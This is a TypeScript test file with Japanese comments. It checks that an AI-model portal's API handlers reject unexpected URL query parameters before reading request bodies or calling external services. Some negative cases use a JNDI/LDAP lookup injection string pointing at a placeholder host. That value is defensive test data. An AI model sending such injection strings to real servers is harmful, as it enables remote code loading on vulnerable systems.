import assert from "node:assert/strict";
import { test } from "node:test";
import { isAllowedPortalQuery } from "../lib/portal-query.ts";
import { handleTextGeneration } from "../lib/model-gateway.ts";
import { handleEmbeddings } from "../lib/embedding-gateway.ts";
import { handleDecision } from "../lib/decision-gateway.ts";
import { handleImageGeneration } from "../lib/image-gateway.ts";
import { handleRerank } from "../lib/rerank-gateway.ts";
import { handleSpeech } from "../lib/speech-gateway.ts";
import { handlePiiRedaction } from "../lib/pii-gateway.ts";
import { handlePiiMcp } from "../lib/pii-mcp-gateway.ts";
import { handleDocumentAnalysis, handleDocumentAnalysisStatus } from "../lib/document-analysis-gateway.ts";
import { handleRealtimeStop } from "../lib/realtime-webrtc.ts";
import { handleModelKeyChoices } from "../lib/model-key-access.ts";
import { handleApiKeys } from "../lib/api-keys/http.ts";
import { handleApiKeyLimits } from "../lib/api-keys/limit-http.ts";
import { handleApiKeyOwner } from "../lib/api-keys/owner-http.ts";
import { handleApiKeyAdministration } from "../lib/api-key-administration/http.ts";
import { handleCompanies } from "../lib/company-administration/http.ts";
import { handleSubscriptionSync } from "../lib/subscription-sync/http.ts";
import { handleGraphToolKeys, handleGraphToolProfile, handleGraphToolConnection } from "../lib/graph-tool-server.ts";
import { sealRealtimeCallHandle } from "../lib/realtime-call-handle.ts";
import { sealDocumentOperation } from "../lib/document-operation-handle.ts";
import { defaultEmbeddingInput } from "../lib/embedding-integration.ts";
import { defaultDecisionInput } from "../lib/decision-integration.ts";
import { defaultRerankInput } from "../lib/rerank-integration.ts";
import { defaultImageInput } from "../lib/image-integration.ts";
import { defaultSpeechInput } from "../lib/speech-integration.ts";
import { getImageGenerationModels, getRealtimeModels, getSpeechModels } from "../lib/model-catalog.ts";
import { chatModel } from "./helpers/model-fixtures.ts";
import { smallEmbedding } from "./helpers/embedding-fixtures.ts";
import type { DecisionModel } from "../lib/decision-types.ts";
import type { RerankModel } from "../lib/rerank-types.ts";

const origin = "https://portal.example.invalid";
const marker = "SYNTHETIC_PRIVATE_QUERY_MARKER";
const actor = { tenantId: "11111111-1111-4111-8111-111111111111", objectId: "22222222-2222-4222-8222-222222222222" };
const apiKeyId = "portal-33333333-3333-4333-8333-333333333333";
const handleSecret = "synthetic-query-test-envelope-key-with-more-than-thirty-two-characters";
const decision: DecisionModel = { id: "synthetic-decision", label: "Synthetic decision", providerId: "microsoft", provider: "Microsoft", apiId: "microsoft-decision-v1", operationId: "systemone", path: "/models/microsoft-decision/v1/systemone", maxRequestBytes: 8192, responseModel: "Synthetic-Decision" };
const rerank: RerankModel = { id: "synthetic-rerank", label: "Synthetic rerank", providerId: "cohere", provider: "Cohere", apiId: "cohere-inference-v1", operationId: "rerank", path: "/models/cohere/v1/rerank", maxRequestBytes: 65_536, maxDocuments: 8, minTopN: 1, maxTopN: 3 };

/** 認証の回数と、query拒否後に開始してはならない外部処理を数えます。 */
function boundary(authenticated = true) {
  const counts = { authentication: 0, external: 0 };
  const forbidden = (): never => { counts.external++; throw new Error(marker); };
  const readActor = async () => { counts.authentication++; return authenticated ? actor : null; };
  return { counts, readActor, readSession: readActor, readOrigin: () => origin, readPortalOrigin: () => origin,
    readModels: forbidden, readGatewayEnvironment: forbidden, resolveSubscriptionKey: forbidden,
    readChoices: forbidden, getService: forbidden, readHandleSecret: () => handleSecret, fetch: forbidden };
}
type Boundary = ReturnType<typeof boundary>;
/** 実HTTPハンドラーと独立合成入力を結び付け、外部サービスを呼ばずに入口の契約を通します。 */
type Target = { path: string; names: readonly string[]; request(query?: string): Request; handle(request: Request, dependencies: Boundary): Promise<Response> };

/** 正規JSON本文を保ったまま、URLだけに負例のqueryを付けます。 */
function jsonRequest(path: string, body: unknown, query = "", method = "POST"): Request {
  return new Request(`${origin}${path}${query}`, { method, headers: { origin, "Content-Type": "application/json" }, body: JSON.stringify(body) });
}
/** 既存の公開入力から組み立てた正規JSONを、同じハンドラーの正常対照にも使います。 */
function jsonTarget(path: string, names: readonly string[], body: unknown, handle: Target["handle"]): Target {
  return { path, names, handle, request: (query) => jsonRequest(path, body, query) };
}
/** 本文内の文書メタデータとファイルを使い、multipart入口にはqueryが不要なことを検証します。 */
function documentRequest(query = ""): Request {
  const form = new FormData();
  form.append("input", JSON.stringify({ apiKeyId, model: "prebuilt-read" }));
  form.append("file", new Blob(["%PDF-1.7\nsynthetic document"], { type: "application/pdf" }), "synthetic.pdf");
  return new Request(`${origin}/api/tools/documents${query}`, { method: "POST", headers: { origin }, body: form });
}

const now = Date.now();
const realtime = getRealtimeModels().find((model) => model.family === "realtime" && model.transport === "webrtc")!;
const stopHandle = sealRealtimeCallHandle({ version: 1, ...actor, apiKeyId, modelId: realtime.id, callId: "synthetic-call", ticket: "synthetic-ticket.synthetic-signature", expiresAt: now + 300_000 }, handleSecret, now);
const operationId = "44444444-4444-4444-8444-444444444444";
const documentHandle = sealDocumentOperation({ operationId, model: "prebuilt-read", statusPath: `/tools/documents/v1/operations/${operationId}`, ticket: "synthetic-ticket.synthetic-signature", expiresAt: new Date(now + 86_400_000).toISOString(), startedAt: now }, actor, apiKeyId, handleSecret);
const piiInput = { apiKeyId, text: "Synthetic contact data", language: "ja" };
const targets: Target[] = [
  jsonTarget("/api/models/decision", ["criteria", "instructions", "message", "questions", "state", "value", "state.message", "state.nested.items.value", "questions.q.instructions", "questions.q.criteria.a", "questions.q.criteria", "synthetic-unapproved-name", "synthetic[unapproved]"], { apiKeyId, ...defaultDecisionInput(decision) }, handleDecision),
  jsonTarget("/api/models/embeddings", ["texts", "texts"], { apiKeyId, ...defaultEmbeddingInput(smallEmbedding) }, handleEmbeddings),
  jsonTarget("/api/models/generate", ["message", "message"], { apiKeyId, modelId: chatModel.id, message: "Synthetic text", maxOutputTokens: 128, stream: false }, handleTextGeneration),
  jsonTarget("/api/models/images", ["prompt", "prompt"], { apiKeyId, ...defaultImageInput(getImageGenerationModels()[0]) }, handleImageGeneration),
  jsonTarget("/api/models/rerank", ["documents", "documents", "query", "query"], { apiKeyId, ...defaultRerankInput(rerank) }, handleRerank),
  jsonTarget("/api/models/speech", ["input.text", "text", "text"], { apiKeyId, ...defaultSpeechInput(getSpeechModels().find((model) => model.kind === "tts")!) }, handleSpeech),
  { path: "/api/tools/documents", names: ["input"], request: documentRequest, handle: handleDocumentAnalysis },
  jsonTarget("/api/tools/pii", ["text", "text"], piiInput, handlePiiRedaction),
  jsonTarget("/api/tools/pii-mcp", ["text", "text"], piiInput, handlePiiMcp),
  jsonTarget("/api/models/realtime/stop", ["handle"], { handle: stopHandle }, handleRealtimeStop),
  jsonTarget("/api/tools/documents/status", ["handle"], { apiKeyId, handle: documentHandle }, handleDocumentAnalysisStatus),
];

test("過去のPortal query負例33件を独立合成値で再構成し、認証後かつ本文・下流処理前に拒否する", async (t) => {
  assert.equal(targets.reduce((count, target) => count + target.names.length, 0), 33);
  for (const target of targets) {
    for (const [index, name] of target.names.entries()) {
      await t.test(`${target.path} / ${name} / ${index}`, async () => {
        const context = boundary();
        const query = `?${new URLSearchParams({ [name]: index % 2 ? "${jndi:ldap://synthetic.example.invalid/query}" : marker })}`;
        const request = target.request(query);
        const response = await target.handle(request, context);
        assert.equal(response.status, 400);
        assert.deepEqual(await response.json(), { error: { code: "InvalidRequest" } });
        assert.equal(response.headers.get("cache-control"), "no-store");
        assert.equal(request.bodyUsed, false);
        assert.deepEqual(context.counts, { authentication: 1, external: 0 });
        assert.equal(request.url, `${origin}${target.path}${query}`);
      });
    }
    const control = boundary();
    const normal = target.request();
    await target.handle(normal, control);
    assert.equal(control.counts.authentication, 1);
    assert.ok(control.counts.external > 0, `${target.path}: queryなしの正規入力は後続処理へ進む`);
  }
});

test("未認証query要求では本文や外部依存に触れず、既存401を維持する", async () => {
  for (const target of targets) {
    const context = boundary(false);
    const request = target.request("?unused=synthetic");
    const response = await target.handle(request, context);
    assert.equal(response.status, 401, target.path);
    assert.deepEqual(await response.json(), { error: { code: "AuthenticationRequired" } });
    assert.equal(request.bodyUsed, false);
    assert.deepEqual(context.counts, { authentication: 1, external: 0 });
  }
});

test("空名・名前のエンコード・重複・空の区切りを拒否し、末尾の疑問符だけは許容する", () => {
  for (const query of ["?=synthetic", "?unused", "?%75nused=synthetic", "?unused=one&unused=two", "?_rsc=synthetic", "?&&"]) {
    assert.equal(isAllowedPortalQuery(new Request(`${origin}/api/models/generate${query}`)), false);
  }
  for (const query of ["", "?"]) assert.equal(isAllowedPortalQuery(new Request(`${origin}/api/models/generate${query}`)), true);
  for (const query of ["?apiId=synthetic", "?%61piId=synthetic"]) assert.equal(isAllowedPortalQuery(new Request(`${origin}/api/models/keys${query}`), ["apiId"]), true);
  for (const query of ["?apiId=one&apiId=two", "?apiId=synthetic&unused=synthetic"]) assert.equal(isAllowedPortalQuery(new Request(`${origin}/api/models/keys${query}`), ["apiId"]), false);
});

/** 公開業務APIの残りの入口も、正規GET queryを保った負例で実ハンドラーを検証します。 */
const additionalApis: { path: string; methods: readonly string[]; handle: Target["handle"]; query?: string }[] = [
  { path: "/api/models/keys", methods: ["GET"], handle: handleModelKeyChoices, query: "apiId=openai-inference-v1" },
  { path: "/api/api-keys", methods: ["GET", "POST"], handle: handleApiKeys },
  { path: `/api/api-keys/${apiKeyId}`, methods: ["POST"], handle: (request, context) => handleApiKeys(request, context, apiKeyId) },
  { path: `/api/api-keys/${apiKeyId}/limits`, methods: ["GET", "PUT"], handle: (request, context) => handleApiKeyLimits(request, context, apiKeyId) },
  { path: `/api/api-keys/${apiKeyId}/owner`, methods: ["GET", "POST"], handle: (request, context) => handleApiKeyOwner(request, context, apiKeyId), query: "search=Synthetic" },
  { path: "/api/api-key-administration", methods: ["GET", "POST"], handle: handleApiKeyAdministration, query: `cursor=${operationId}` },
  { path: "/api/api-key-administration/access", methods: ["GET"], handle: (request, context) => handleApiKeyAdministration(request, context, true) },
  { path: "/api/companies", methods: ["GET"], handle: handleCompanies },
  { path: "/api/company-administration", methods: ["GET", "POST"], handle: (request, context) => handleCompanies(request, context, true) },
  { path: `/api/company-administration/${operationId}`, methods: ["PATCH"], handle: (request, context) => handleCompanies(request, context, true, operationId) },
  { path: "/api/subscription-sync", methods: ["GET", "POST"], handle: handleSubscriptionSync },
  { path: "/api/tools/graph/keys", methods: ["GET"], handle: handleGraphToolKeys },
  { path: "/api/tools/graph/profile", methods: ["POST"], handle: handleGraphToolProfile },
  { path: "/api/tools/graph/connection", methods: ["POST"], handle: handleGraphToolConnection },
];

test("公開業務API25経路31methodを覆い、未許可queryでサービスや本文へ進まず認証順を維持する", async () => {
  assert.equal(targets.length + additionalApis.length, 25);
  assert.equal(targets.length + additionalApis.reduce((count, api) => count + api.methods.length, 0), 31);
  for (const api of additionalApis) {
    for (const method of api.methods) {
      for (const authenticated of [true, false]) {
        const context = boundary(authenticated);
        const query = `?${api.query && method === "GET" ? `${api.query}&` : ""}unused=${marker}`;
        const request = method === "GET" ? new Request(`${origin}${api.path}${query}`) : jsonRequest(api.path, {}, query, method);
        const response = await api.handle(request, context);
        assert.equal(response.status, authenticated ? 400 : 401, `${method} ${api.path}`);
        assert.deepEqual(await response.json(), { error: { code: authenticated ? "InvalidRequest" : "AuthenticationRequired" } });
        assert.equal(request.bodyUsed, false);
        assert.deepEqual(context.counts, { authentication: 1, external: 0 });
      }
    }
  }
});

test("会社・同期・Graph・文書の空query区切りも、既存どおり本文やサービス前に拒否する", async () => {
  for (const api of additionalApis.filter((api) => ["/api/companies", "/api/subscription-sync", "/api/tools/graph/keys", "/api/tools/graph/profile", "/api/tools/graph/connection"].includes(api.path))) {
    for (const method of api.methods) {
      const context = boundary();
      const request = method === "GET" ? new Request(`${origin}${api.path}?&&`) : jsonRequest(api.path, {}, "?&&", method);
      const response = await api.handle(request, context);
      assert.equal(response.status, 400, `${method} ${api.path}`);
      assert.deepEqual(await response.json(), { error: { code: "InvalidRequest" } });
      assert.equal(request.bodyUsed, false);
      assert.deepEqual(context.counts, { authentication: 1, external: 0 });
    }
  }
  for (const target of targets.filter((target) => target.path.startsWith("/api/tools/documents"))) {
    const context = boundary();
    const request = target.request("?&&");
    const response = await target.handle(request, context);
    assert.equal(response.status, 400, target.path);
    assert.deepEqual(await response.json(), { error: { code: "InvalidRequest" } });
    assert.equal(request.bodyUsed, false);
    assert.deepEqual(context.counts, { authentication: 1, external: 0 });
  }
});
